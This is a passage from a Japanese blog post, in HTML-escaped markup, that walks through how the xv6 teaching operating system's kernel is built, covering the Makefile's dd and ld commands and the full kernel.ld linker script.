    &lt;span class=&quot;token function&quot;&gt;readseg&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pa&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;filesz&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;off&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token keyword&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;memsz &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;filesz&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
      &lt;span class=&quot;token function&quot;&gt;stosb&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pa &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;filesz&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;memsz &lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt; ph&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;filesz&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;token comment&quot;&gt;// Call the entry point from the ELF header.&lt;/span&gt;
  &lt;span class=&quot;token comment&quot;&gt;// Does not return!&lt;/span&gt;
  entry &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;elf&lt;span class=&quot;token operator&quot;&gt;-&gt;&lt;/span&gt;entry&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;token function&quot;&gt;entry&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;そのため、今回は&lt;code class=&quot;language-text&quot;&gt;entry()&lt;/code&gt;関数を探すところから始めていきたいと思います。&lt;/p&gt;
&lt;h2 id=&quot;カーネルプログラムのビルド&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%81%AE%E3%83%93%E3%83%AB%E3%83%89&quot; aria-label=&quot;カーネルプログラムのビルド permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;カーネルプログラムのビルド&lt;/h2&gt;
&lt;p&gt;カーネルプログラムのビルドの流れを追います。&lt;/p&gt;
&lt;p&gt;最終的なイメージファイルである&lt;code class=&quot;language-text&quot;&gt;xv6.img&lt;/code&gt;は、以下のコマンドで生成されていました。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;0x10000&lt;/code&gt;の空領域に&lt;code class=&quot;language-text&quot;&gt;bootblock&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;kernel&lt;/code&gt;を埋め込んだものが&lt;code class=&quot;language-text&quot;&gt;xv6.img&lt;/code&gt;になります。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;xv6.img: bootblock kernel
	&lt;span class=&quot;token function&quot;&gt;dd&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;/dev/zero &lt;span class=&quot;token assign-left variable&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;xv6.img &lt;span class=&quot;token assign-left variable&quot;&gt;count&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;10000&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;dd&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;bootblock &lt;span class=&quot;token assign-left variable&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;xv6.img &lt;span class=&quot;token assign-left variable&quot;&gt;conv&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;notrunc
	&lt;span class=&quot;token function&quot;&gt;dd&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;kernel &lt;span class=&quot;token assign-left variable&quot;&gt;of&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;xv6.img &lt;span class=&quot;token assign-left variable&quot;&gt;seek&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;token assign-left variable&quot;&gt;conv&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt;notrunc&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;bootblock&lt;/code&gt;については前回追ったので、今回は&lt;code class=&quot;language-text&quot;&gt;kernel&lt;/code&gt;を追っていきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;kernel: &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;OBJS&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt; entry.o entryother initcode kernel.ld
	&lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;LD&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;LDFLAGS&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt; -T kernel.ld -o kernel entry.o &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;OBJS&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt; -b binary initcode entryother
	&lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;OBJDUMP&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt; -S kernel &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; kernel.asm
	&lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;OBJDUMP&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt; -t kernel &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;sed&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&apos;1,/SYMBOL TABLE/d; s/ .* / /; /^$$/d&apos;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&lt;/span&gt; kernel.sym&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;kernel&lt;/code&gt;の依存関係は&lt;code class=&quot;language-text&quot;&gt;$(OBJS) entry.o entryother initcode kernel.ld&lt;/code&gt;になってます。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;$(OBJS)&lt;/code&gt;の一覧は結構数が多いので割愛します。&lt;code class=&quot;language-text&quot;&gt;main.o&lt;/code&gt;など、カーネルのモジュールが含まれます。&lt;/p&gt;
&lt;p&gt;下の2行はバイナリの逆アセンブル結果とシンボル情報を出力しているのみで、実際にバイナリを作成しているのは&lt;code class=&quot;language-text&quot;&gt;$(LD) $(LDFLAGS) -T kernel.ld -o kernel entry.o $(OBJS) -b binary initcode entryother&lt;/code&gt;の行です。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;LD&lt;/code&gt;は、前回説明した&lt;code class=&quot;language-text&quot;&gt;GCC&lt;/code&gt;と同じく&lt;code class=&quot;language-text&quot;&gt;$(TOOLPREFIX)ld&lt;/code&gt;の形式で使用されます。&lt;/p&gt;
&lt;p&gt;今回はクロスコンパイルは行わないので、普通に&lt;code class=&quot;language-text&quot;&gt;ld&lt;/code&gt;コマンドが実行されます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;LD &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;TOOLPREFIX&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt;ld

&lt;span class=&quot;token comment&quot;&gt;# FreeBSD ld wants ``elf_i386_fbsd&apos;&apos;&lt;/span&gt;
LDFLAGS &lt;span class=&quot;token operator&quot;&gt;+=&lt;/span&gt; -m &lt;span class=&quot;token variable&quot;&gt;&lt;span class=&quot;token variable&quot;&gt;$(&lt;/span&gt;shell &lt;span class=&quot;token punctuation&quot;&gt;$(&lt;/span&gt;LD&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; -V &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;grep&lt;/span&gt; elf_i386 &lt;span class=&quot;token operator&quot;&gt;&lt;span class=&quot;token file-descriptor important&quot;&gt;2&lt;/span&gt;&gt;&lt;/span&gt;/dev/null &lt;span class=&quot;token operator&quot;&gt;|&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;head&lt;/span&gt; -n &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token variable&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;LDFLAGS&lt;/code&gt;は、&lt;code class=&quot;language-text&quot;&gt;ld -V&lt;/code&gt;の結果から&lt;code class=&quot;language-text&quot;&gt;elf_i386&lt;/code&gt;を抽出して&lt;code class=&quot;language-text&quot;&gt;-m elf_i386&lt;/code&gt;オプションとして表示させています。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;ld -V&lt;/code&gt;は、&lt;code class=&quot;language-text&quot;&gt;ld&lt;/code&gt;コマンドのバージョン確認コマンドのうち、サポートしているエミュレータの一覧を表示するオプション付きのコマンドです。&lt;/p&gt;
&lt;p&gt;実際にビルド時に実行されるコマンドは以下のようになります。&lt;/p&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;-T&lt;/code&gt;オプションは&lt;code class=&quot;language-text&quot;&gt;-c&lt;/code&gt;オプションと同じく、リンカスクリプト(&lt;code class=&quot;language-text&quot;&gt;kernel.ld&lt;/code&gt;)からリンクコマンドを読み込むオプションです。&lt;/p&gt;
&lt;p&gt;また、&lt;code class=&quot;language-text&quot;&gt;-b&lt;/code&gt;オプションは以降にインプットするオブジェクトファイルのバイナリフォーマットを指定するコマンドで、今回は&lt;code class=&quot;language-text&quot;&gt;binary&lt;/code&gt;を指定しているようです。&lt;/p&gt;
&lt;p&gt;以降に続く&lt;code class=&quot;language-text&quot;&gt;initcode&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;entryother&lt;/code&gt;はアセンブリファイルからアセンブルされたバイナリです。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;ld -m elf_i386 -T kernel.ld -o kernel &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
entry.o bio.o console.o exec.o file.o fs.o ide.o ioapic.o kalloc.o kbd.o lapic.o log.o main.o mp.o picirq.o pipe.o proc.o sleeplock.o spinlock.o string.o swtch.o syscall.o sysfile.o sysproc.o trapasm.o trap.o uart.o vectors.o vm.o  &lt;span class=&quot;token punctuation&quot;&gt;\&lt;/span&gt;
-b binary initcode entryother&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://ftp.gnu.org/old-gnu/Manuals/ld-2.9.1/html_node/ld_3.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;LD、GNUリンカーの使用-オプション&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;次にリンカスクリプト&lt;code class=&quot;language-text&quot;&gt;kernel.ld&lt;/code&gt;の中身を見てみます。&lt;/p&gt;
&lt;h3 id=&quot;リンカスクリプト&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%83%AA%E3%83%B3%E3%82%AB%E3%82%B9%E3%82%AF%E3%83%AA%E3%83%97%E3%83%88&quot; aria-label=&quot;リンカスクリプト permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;リンカスクリプト&lt;/h3&gt;
&lt;p&gt;そもそもリンカスクリプトについてですが、リンカがオブジェクトファイルをリンクして実行形式を作成する際に、オブジェクトのメモリ配置を指定するためのファイルです。&lt;/p&gt;
&lt;p&gt;通常は、リンカに内臓されているデフォルトのリンカスクリプトが使用されるため、明示的に指定する必要はありません。&lt;/p&gt;
&lt;p&gt;ちなみに、リンカに内臓されているデフォルトのリンカスクリプトは&lt;code class=&quot;language-text&quot;&gt;ld&lt;/code&gt;コマンドに&lt;code class=&quot;language-text&quot;&gt;--verbose&lt;/code&gt;オプションを付けると出力できます。&lt;/p&gt;
&lt;p&gt;ただし、OSなど組込み系のプログラムの場合は、汎用OSの管理機能が使えないため、リンカスクリプトを独自に設定する必要があります。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://sourceware.org/binutils/docs/ld/Scripts.html#Scripts&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Scripts (LD)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://sourceware.org/binutils/docs/ld/Basic-Script-Concepts.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Basic Script Concepts (LD)&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://www.computex.co.jp/article/use_gcc_1.htm&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;GNU Cを使いこなそう | 株式会社コンピューテックス&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;xv6OSでカーネルのビルドに使用するリンカスクリプトの全文は以下です。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;/* Simple linker script for the JOS kernel.
   See the GNU ld &apos;info&apos; manual (&quot;info ld&quot;) to learn the syntax. */&lt;/span&gt;

&lt;span class=&quot;token function&quot;&gt;OUTPUT_FORMAT&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;elf32-i386&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;elf32-i386&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;elf32-i386&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;OUTPUT_ARCH&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;i386&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token function&quot;&gt;ENTRY&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;_start&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;

SECTIONS
&lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
	&lt;span class=&quot;token comment&quot;&gt;/* Link the kernel at this address: &quot;.&quot; means the current address */&lt;/span&gt;
        &lt;span class=&quot;token comment&quot;&gt;/* Must be equal to KERNLINK */&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0x80100000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;AT&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x100000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;stub &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;text&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;gnu&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;linkonce&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;t&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;token function&quot;&gt;PROVIDE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;etext &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;	&lt;span class=&quot;token comment&quot;&gt;/* Define the &apos;etext&apos; symbol to this value */&lt;/span&gt;

	&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;rodata &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;rodata &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;rodata&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;gnu&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;linkonce&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;r&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;token comment&quot;&gt;/* Include debugging information in kernel memory */&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;stab &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;token function&quot;&gt;PROVIDE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;__STAB_BEGIN__ &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;stab&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token function&quot;&gt;PROVIDE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;__STAB_END__ &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;stabstr &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;token function&quot;&gt;PROVIDE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;__STABSTR_BEGIN__ &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;stabstr&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
		&lt;span class=&quot;token function&quot;&gt;PROVIDE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;__STABSTR_END__ &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;token comment&quot;&gt;/* Adjust the address for the data segment to the next page */&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;ALIGN&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;0x1000&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;token comment&quot;&gt;/* Conventionally, Unix linkers provide pseudo-symbols
	 * etext, edata, and end, at the end of the text, data, and bss.
	 * For the kernel mapping, we need the address at the beginning
	 * of the data section, but that&apos;s not one of the conventional
	 * symbols, because the convention started before there was a
	 * read-only rodata section between text and data. */&lt;/span&gt;
	&lt;span class=&quot;token function&quot;&gt;PROVIDE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;data &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;token comment&quot;&gt;/* The data segment */&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;data&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
	&lt;span class=&quot;token punctuation&quot;&gt;}&lt;/span&gt;

	&lt;span class=&quot;token function&quot;&gt;PROVIDE&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;edata &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

	&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bss &lt;span class=&quot;token operator&quot;&gt;:&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;{&lt;/span&gt;
		&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;bss&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
